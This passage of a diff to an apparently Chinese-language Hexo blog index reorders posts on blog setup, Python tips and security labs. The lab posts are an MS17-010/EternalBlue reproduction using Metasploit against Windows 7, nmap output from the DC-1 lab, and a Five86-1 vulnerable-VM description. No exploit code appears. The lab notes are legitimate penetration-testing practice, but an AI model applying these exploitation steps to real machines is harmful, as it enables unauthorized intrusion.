@@ -89,57 +89,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Blog Reference Link</title>
-    <url>/2019/06/14/Blog-Reference-Link/</url>
-    <content><![CDATA[<blockquote><p>恩 有点特别的信<br>但是<br>但这是……<br>世界上最纯粹最美丽的思念</p>
-<footer><strong>文伽</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep102379" target="_blank" rel="noopener">Bilibili《死后文》</a></cite></footer></blockquote>
-
-<a id="more"></a>
-<hr>
-<!-- ![68527244_p0.jpg](68527244_p0.jpg) -->
-<img src="/2019/06/14/Blog-Reference-Link/68527244_p0.jpg" width="600" height="600" title="68527244_p0.jpg">
-
-<br>
-
-<p>配置 Blog时参考的链接：</p>
-<ul>
-<li><a href="https://blog.csdn.net/u011475210/article/details/79023429" target="_blank" rel="noopener">从jekyll到hexo</a></li>
-<li><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></li>
-<li><a href="https://www.jianshu.com/p/1f8107a8778c" target="_blank" rel="noopener">hexo搭建个人博客–NexT主题优化</a></li>
-<li><a href="https://blog.csdn.net/u011054333/article/details/82718910" target="_blank" rel="noopener">在Hexo博客上添加可爱的Live2D模型</a></li>
-<li><a href="https://www.jianshu.com/p/baea8c95e39b" target="_blank" rel="noopener">Hexo添加字数统计、阅读时长</a></li>
-<li><a href="https://segmentfault.com/q/1010000017254914" target="_blank" rel="noopener">下载的hexo主题必须删掉.git</a></li>
-<li><a href="https://www.cnblogs.com/php-linux/p/8416116.html" target="_blank" rel="noopener">2个小时教你hexo博客添加评论、打赏…</a></li>
-<li><a href="https://blog.csdn.net/qq_36759224/article/details/82121420#font_colorFF000__Hexo__Github_font_155" target="_blank" rel="noopener">使用GithubPages和Hexo搭建自己…</a></li>
-<li><a href="https://hubojing.github.io/2016/04/06/%E5%B0%86hexo-github%E5%8D%9A%E5%AE%A2%E5%90%8C%E6%AD%A5%E6%89%98%E7%AE%A1%E8%87%B3coding/" target="_blank" rel="noopener">将hexo+github博客同步托管至coding</a></li>
-<li><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT使用文档</a></li>
-<li><a href="https://www.jianshu.com/p/2e318226c88d" target="_blank" rel="noopener">使用Hexo+Next主题搭建自己的个人博客</a></li>
-</ul>
-<br>
-
-<ul>
-<li><a href="https://iochen.com/2018/01/06/use-gitalk-in-hexo/" target="_blank" rel="noopener">Hexo中Gitalk配置使用教程</a></li>
-<li><a href="https://asdfv1929.github.io/2018/01/20/gitalk/" target="_blank" rel="noopener">Hexo NexT主题中集成gitalk评论系统</a></li>
-<li><a href="https://tyloafer.github.io/posts/7790/" target="_blank" rel="noopener">Hexo中引入Mermaid流程图</a></li>
-<li><a href="https://github.com/webappdevelp/hexo-filter-mermaid-diagrams" target="_blank" rel="noopener">hexo-filter-mermaid-diagrams</a></li>
-</ul>
-<hr>
-<blockquote>
-<p>配置 gitalk评论系统注意</p>
-</blockquote>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gitalk.swig </span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> gitalk = <span class="keyword">new</span> Gitalk(&#123;</span><br><span class="line">      clientID: <span class="string">'&#123;&#123; theme.gitalk.ClientID &#125;&#125;'</span>,   <span class="comment">// &lt;----</span></span><br><span class="line">      clientSecret: <span class="string">'&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;'</span>, <span class="comment">// &lt;----</span></span><br><span class="line">      repo: <span class="string">'&#123;&#123; theme.gitalk.repo &#125;&#125;'</span>,</span><br><span class="line">      owner: <span class="string">'&#123;&#123; theme.gitalk.githubID &#125;&#125;'</span>,</span><br><span class="line">      admin: [<span class="string">'&#123;&#123; theme.gitalk.adminUser &#125;&#125;'</span>],</span><br><span class="line">      id: location.pathname,</span><br><span class="line">      distractionFreeMode: <span class="string">'&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    gitalk.render(<span class="string">'gitalk-container'</span>)           </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">githubID:</span> <span class="string">evilH2O2</span>  </span><br><span class="line">  <span class="attr">repo:</span> <span class="string">gitalkComments</span>   </span><br><span class="line">  <span class="attr">ClientID:</span> <span class="string">xxxx</span>      <span class="comment"># &lt;---- 与上面对应，网上有版本不一样的 （ client_id )</span></span><br><span class="line">  <span class="attr">ClientSecret:</span> <span class="string">xxx</span>   <span class="comment"># &lt;---- 与上面对应</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">evilH2O2</span></span><br><span class="line">  <span class="attr">adminUser:</span> <span class="string">evilH2O2</span> </span><br><span class="line">  <span class="attr">distractionFreeMode:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>用 代码块(3个 `) + mermaid使用 Mermaid流程图</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ``3 mermaid</span></span><br><span class="line"><span class="comment"># graph LR </span></span><br><span class="line"><span class="comment">#   A --&gt; B</span></span><br><span class="line"><span class="comment"># ``3</span></span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>Note</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ADB常用命令</title>
     <url>/2019/06/21/ADB%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<blockquote><p>摘下红花送伊人<br>红花似火绾青丝<br>红花啊红花，绾起伊人的青丝<br>伊人笑靥如花</p>
@@ -205,6 +154,57 @@
 ]]></content>
       <tags>
         <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Blog Reference Link</title>
+    <url>/2019/06/14/Blog-Reference-Link/</url>
+    <content><![CDATA[<blockquote><p>恩 有点特别的信<br>但是<br>但这是……<br>世界上最纯粹最美丽的思念</p>
+<footer><strong>文伽</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep102379" target="_blank" rel="noopener">Bilibili《死后文》</a></cite></footer></blockquote>
+
+<a id="more"></a>
+<hr>
+<!-- ![68527244_p0.jpg](68527244_p0.jpg) -->
+<img src="/2019/06/14/Blog-Reference-Link/68527244_p0.jpg" width="600" height="600" title="68527244_p0.jpg">
+
+<br>
+
+<p>配置 Blog时参考的链接：</p>
+<ul>
+<li><a href="https://blog.csdn.net/u011475210/article/details/79023429" target="_blank" rel="noopener">从jekyll到hexo</a></li>
+<li><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></li>
+<li><a href="https://www.jianshu.com/p/1f8107a8778c" target="_blank" rel="noopener">hexo搭建个人博客–NexT主题优化</a></li>
+<li><a href="https://blog.csdn.net/u011054333/article/details/82718910" target="_blank" rel="noopener">在Hexo博客上添加可爱的Live2D模型</a></li>
+<li><a href="https://www.jianshu.com/p/baea8c95e39b" target="_blank" rel="noopener">Hexo添加字数统计、阅读时长</a></li>
+<li><a href="https://segmentfault.com/q/1010000017254914" target="_blank" rel="noopener">下载的hexo主题必须删掉.git</a></li>
+<li><a href="https://www.cnblogs.com/php-linux/p/8416116.html" target="_blank" rel="noopener">2个小时教你hexo博客添加评论、打赏…</a></li>
+<li><a href="https://blog.csdn.net/qq_36759224/article/details/82121420#font_colorFF000__Hexo__Github_font_155" target="_blank" rel="noopener">使用GithubPages和Hexo搭建自己…</a></li>
+<li><a href="https://hubojing.github.io/2016/04/06/%E5%B0%86hexo-github%E5%8D%9A%E5%AE%A2%E5%90%8C%E6%AD%A5%E6%89%98%E7%AE%A1%E8%87%B3coding/" target="_blank" rel="noopener">将hexo+github博客同步托管至coding</a></li>
+<li><a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT使用文档</a></li>
+<li><a href="https://www.jianshu.com/p/2e318226c88d" target="_blank" rel="noopener">使用Hexo+Next主题搭建自己的个人博客</a></li>
+</ul>
+<br>
+
+<ul>
+<li><a href="https://iochen.com/2018/01/06/use-gitalk-in-hexo/" target="_blank" rel="noopener">Hexo中Gitalk配置使用教程</a></li>
+<li><a href="https://asdfv1929.github.io/2018/01/20/gitalk/" target="_blank" rel="noopener">Hexo NexT主题中集成gitalk评论系统</a></li>
+<li><a href="https://tyloafer.github.io/posts/7790/" target="_blank" rel="noopener">Hexo中引入Mermaid流程图</a></li>
+<li><a href="https://github.com/webappdevelp/hexo-filter-mermaid-diagrams" target="_blank" rel="noopener">hexo-filter-mermaid-diagrams</a></li>
+</ul>
+<hr>
+<blockquote>
+<p>配置 gitalk评论系统注意</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gitalk.swig </span></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> gitalk = <span class="keyword">new</span> Gitalk(&#123;</span><br><span class="line">      clientID: <span class="string">'&#123;&#123; theme.gitalk.ClientID &#125;&#125;'</span>,   <span class="comment">// &lt;----</span></span><br><span class="line">      clientSecret: <span class="string">'&#123;&#123; theme.gitalk.ClientSecret &#125;&#125;'</span>, <span class="comment">// &lt;----</span></span><br><span class="line">      repo: <span class="string">'&#123;&#123; theme.gitalk.repo &#125;&#125;'</span>,</span><br><span class="line">      owner: <span class="string">'&#123;&#123; theme.gitalk.githubID &#125;&#125;'</span>,</span><br><span class="line">      admin: [<span class="string">'&#123;&#123; theme.gitalk.adminUser &#125;&#125;'</span>],</span><br><span class="line">      id: location.pathname,</span><br><span class="line">      distractionFreeMode: <span class="string">'&#123;&#123; theme.gitalk.distractionFreeMode &#125;&#125;'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    gitalk.render(<span class="string">'gitalk-container'</span>)           </span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitalk:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">githubID:</span> <span class="string">evilH2O2</span>  </span><br><span class="line">  <span class="attr">repo:</span> <span class="string">gitalkComments</span>   </span><br><span class="line">  <span class="attr">ClientID:</span> <span class="string">xxxx</span>      <span class="comment"># &lt;---- 与上面对应，网上有版本不一样的 （ client_id )</span></span><br><span class="line">  <span class="attr">ClientSecret:</span> <span class="string">xxx</span>   <span class="comment"># &lt;---- 与上面对应</span></span><br><span class="line">  <span class="attr">owner:</span> <span class="string">evilH2O2</span></span><br><span class="line">  <span class="attr">adminUser:</span> <span class="string">evilH2O2</span> </span><br><span class="line">  <span class="attr">distractionFreeMode:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>用 代码块(3个 `) + mermaid使用 Mermaid流程图</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ``3 mermaid</span></span><br><span class="line"><span class="comment"># graph LR </span></span><br><span class="line"><span class="comment">#   A --&gt; B</span></span><br><span class="line"><span class="comment"># ``3</span></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Note</tag>
       </tags>
   </entry>
   <entry>
@@ -760,6 +760,27 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       </tags>
   </entry>
   <entry>
+    <title>Python不常用用法</title>
+    <url>/2019/09/04/Python%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p>Python 日常使用时的一些方法或技巧，怕忘记怕麻烦，记录一下</p>
+<a id="more"></a>
+
+<h2 id="通过值获取键"><a href="#通过值获取键" class="headerlink" title="通过值获取键"></a>通过值获取键</h2><br>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dct = &#123;<span class="string">'Name'</span>: <span class="string">'Alice'</span>, <span class="string">'Age'</span>: <span class="number">18</span>, <span class="string">'uid'</span>: <span class="number">1001</span>, <span class="string">'id'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get_key1</span><span class="params">(dct, value)</span>:</span></span><br><span class="line"><span class="meta">... </span>  <span class="keyword">return</span> list(filter(<span class="keyword">lambda</span> k:dct[k] == value, dct))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_key1(dct, <span class="number">1001</span>)</span><br><span class="line">[<span class="string">'id'</span>, <span class="string">'uid'</span>]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 某函数返回的结果（参数 md5dict）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561284.jpg'</span>: <span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561271.jpg'</span>: <span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561279.jpg'</span>: <span class="string">'e5af4c3275dafbef5932ab69c446374c'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量 cp的内容</span></span><br><span class="line">(<span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, <span class="number">2</span>)</span><br><span class="line">(<span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'e5af4c3275dafbef5932ab69c446374c'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysedDict</span><span class="params">(md5dict)</span>:</span></span><br><span class="line">    cp = Counter(md5dict.values())  <span class="comment"># 只取 MD5值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filterFun</span><span class="params">(dicts, value)</span>:</span></span><br><span class="line">        bad = list(filter(<span class="keyword">lambda</span> k:dicts[k] == value, dicts))</span><br><span class="line">        print(bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.items():</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">1</span>] &gt; <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">"\033[0;31m&#123;0&#125;\033[0m"</span>.format(i))</span><br><span class="line">            filterFun(md5dict, i[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line"><span class="comment"># ---- 结果 ------</span></span><br><span class="line"><span class="comment"># ('6beb7af8d37e26eb88bb1b75c8e51474', 2)</span></span><br><span class="line"><span class="comment"># ['/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg', '/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg']</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="快速启动-http服务器"><a href="#快速启动-http服务器" class="headerlink" title="快速启动 http服务器"></a>快速启动 http服务器</h2><br>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows域认证体系—Kerberos认证</title>
     <url>/2019/08/25/Windows%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94Kerberos%E8%AE%A4%E8%AF%81/</url>
     <content><![CDATA[<p>Kerberos认证流程、含义</p>
@@ -925,6 +946,49 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       </tags>
   </entry>
   <entry>
+    <title>MS17-010复现</title>
+    <url>/2019/09/13/MS17-010%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>MS17-010/EternalBlue/永恒之蓝</p>
+<a id="more"></a>
+
+<p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">Microsoft 安全公告 MS17-010</a></p>
+<p>当 Microsoft 服务器消息块 1.0 (SMBv1)服务器处理某些请求时，存在多个远程执行代码漏洞。<br>成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力</p>
+<p>受影响的系统(详细系统版本请查看公告)：</p>
+<ul>
+<li>Windows Vista</li>
+<li>Windows Server 2008</li>
+<li>Windows 7</li>
+<li>Windows Server 2008 R2</li>
+<li>Windows 8.1</li>
+<li>Windows Server 2012 和 Windows Server 2012 R2</li>
+<li>Windows RT 8.1</li>
+<li>Windows 10</li>
+<li>Windows Server 2016</li>
+</ul>
+<p>相对应的 CVE（Windows SMB 远程代码执行漏洞）：</p>
+<ul>
+<li>CVE-2017-0143</li>
+<li>CVE-2017-0144</li>
+<li>CVE-2017-0145</li>
+<li>CVE-2017-0146</li>
+<li>CVE-2017-0148</li>
+</ul>
+<br>
+
+<p>复现环境：</p>
+<ul>
+<li>Windows 7 (Build 7601, Service Pack 1)</li>
+<li>Ubuntu server(Metasploit)</li>
+</ul>
+<br>
+
+<p><img src="./2019-09-13%2011-24-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="搜索漏洞"><br><img src="./2019-09-13%2011-10-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="扫描模块"><br><img src="./2019-09-13%2010-41-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 meterpreter"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2019-0708复现</title>
     <url>/2019/09/12/CVE-2019-0708%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p>CVE-2019-0708 远程桌面服务的远程代码执行漏洞, 漏洞触发无需用户交互</p>
@@ -971,70 +1035,6 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
 ]]></content>
       <tags>
         <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MS17-010复现</title>
-    <url>/2019/09/13/MS17-010%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>MS17-010/EternalBlue/永恒之蓝</p>
-<a id="more"></a>
-
-<p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">Microsoft 安全公告 MS17-010</a></p>
-<p>当 Microsoft 服务器消息块 1.0 (SMBv1)服务器处理某些请求时，存在多个远程执行代码漏洞。<br>成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力</p>
-<p>受影响的系统(详细系统版本请查看公告)：</p>
-<ul>
-<li>Windows Vista</li>
-<li>Windows Server 2008</li>
-<li>Windows 7</li>
-<li>Windows Server 2008 R2</li>
-<li>Windows 8.1</li>
-<li>Windows Server 2012 和 Windows Server 2012 R2</li>
-<li>Windows RT 8.1</li>
-<li>Windows 10</li>
-<li>Windows Server 2016</li>
-</ul>
-<p>相对应的 CVE（Windows SMB 远程代码执行漏洞）：</p>
-<ul>
-<li>CVE-2017-0143</li>
-<li>CVE-2017-0144</li>
-<li>CVE-2017-0145</li>
-<li>CVE-2017-0146</li>
-<li>CVE-2017-0148</li>
-</ul>
-<br>
-
-<p>复现环境：</p>
-<ul>
-<li>Windows 7 (Build 7601, Service Pack 1)</li>
-<li>Ubuntu server(Metasploit)</li>
-</ul>
-<br>
-
-<p><img src="./2019-09-13%2011-24-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="搜索漏洞"><br><img src="./2019-09-13%2011-10-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="扫描模块"><br><img src="./2019-09-13%2010-41-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 meterpreter"></p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Python不常用用法</title>
-    <url>/2019/09/04/Python%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/</url>
-    <content><![CDATA[<p>Python 日常使用时的一些方法或技巧，怕忘记怕麻烦，记录一下</p>
-<a id="more"></a>
-
-<h2 id="通过值获取键"><a href="#通过值获取键" class="headerlink" title="通过值获取键"></a>通过值获取键</h2><br>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dct = &#123;<span class="string">'Name'</span>: <span class="string">'Alice'</span>, <span class="string">'Age'</span>: <span class="number">18</span>, <span class="string">'uid'</span>: <span class="number">1001</span>, <span class="string">'id'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get_key1</span><span class="params">(dct, value)</span>:</span></span><br><span class="line"><span class="meta">... </span>  <span class="keyword">return</span> list(filter(<span class="keyword">lambda</span> k:dct[k] == value, dct))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_key1(dct, <span class="number">1001</span>)</span><br><span class="line">[<span class="string">'id'</span>, <span class="string">'uid'</span>]</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 某函数返回的结果（参数 md5dict）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561284.jpg'</span>: <span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561271.jpg'</span>: <span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561279.jpg'</span>: <span class="string">'e5af4c3275dafbef5932ab69c446374c'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量 cp的内容</span></span><br><span class="line">(<span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, <span class="number">2</span>)</span><br><span class="line">(<span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'e5af4c3275dafbef5932ab69c446374c'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysedDict</span><span class="params">(md5dict)</span>:</span></span><br><span class="line">    cp = Counter(md5dict.values())  <span class="comment"># 只取 MD5值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filterFun</span><span class="params">(dicts, value)</span>:</span></span><br><span class="line">        bad = list(filter(<span class="keyword">lambda</span> k:dicts[k] == value, dicts))</span><br><span class="line">        print(bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.items():</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">1</span>] &gt; <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">"\033[0;31m&#123;0&#125;\033[0m"</span>.format(i))</span><br><span class="line">            filterFun(md5dict, i[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line"><span class="comment"># ---- 结果 ------</span></span><br><span class="line"><span class="comment"># ('6beb7af8d37e26eb88bb1b75c8e51474', 2)</span></span><br><span class="line"><span class="comment"># ['/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg', '/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg']</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="快速启动-http服务器"><a href="#快速启动-http服务器" class="headerlink" title="快速启动 http服务器"></a>快速启动 http服务器</h2><br>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -1185,63 +1185,178 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       </tags>
   </entry>
   <entry>
-    <title>DC-1</title>
-    <url>/2020/03/19/DC-1/</url>
+    <title>Five86-1</title>
+    <url>/2020/03/10/Five86-1/</url>
     <content><![CDATA[<blockquote>
-<p>2020-03-17</p>
+<p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p>
 </blockquote>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian))</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br></pre></td></tr></table></figure>
+<br>
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">################## ALL Port ###########################3</span></span><br><span class="line">PORT STATE SERVICE VERSION</span><br><span class="line">22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0) </span><br><span class="line">| ssh-hostkey:</span><br><span class="line">| 1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">| 2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA) </span><br><span class="line">|_ 256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp open http Apache httpd 2.2.22 ((Debian)) |_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">|/themes//CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">|/INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp open rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">| program version port/proto service</span><br><span class="line">...</span><br><span class="line">35460/tcp open status 1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> another purposely built vulnerable lab <span class="keyword">with</span> <span class="keyword">the</span> intent <span class="keyword">of</span> gaining experience <span class="keyword">in</span> <span class="keyword">the</span> world <span class="keyword">of</span> penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">get</span> root <span class="keyword">and</span> <span class="keyword">to</span> <span class="built_in">read</span> <span class="keyword">the</span> one <span class="keyword">and</span> only flag.</span><br><span class="line"></span><br><span class="line">Linux skills <span class="keyword">and</span> familiarity <span class="keyword">with</span> <span class="keyword">the</span> Linux command line are a must, <span class="keyword">as</span> <span class="keyword">is</span> <span class="keyword">some</span> experience <span class="keyword">with</span> basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be <span class="keyword">of</span> great assistance, <span class="keyword">but</span> you can always tweet <span class="keyword">me</span> <span class="keyword">at</span> @DCAU7 <span class="keyword">for</span> assistance <span class="keyword">to</span> <span class="keyword">get</span> you going again. But take note: I won't give you <span class="keyword">the</span> answer, instead, I'll give you an idea <span class="keyword">about</span> how <span class="keyword">to</span> move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> a VirtualBox VM built <span class="keyword">on</span> Debian <span class="number">64</span> bit, <span class="keyword">but</span> there shouldn't be any issues <span class="built_in">running</span> <span class="keyword">it</span> <span class="keyword">on</span> most PCs.</span><br><span class="line"></span><br><span class="line">Five86<span class="number">-1</span> has been tested successfully <span class="keyword">on</span> VMWare Player, <span class="keyword">but</span> <span class="keyword">if</span> there are any issues <span class="built_in">running</span> this VM <span class="keyword">in</span> VMware, have a <span class="built_in">read</span> <span 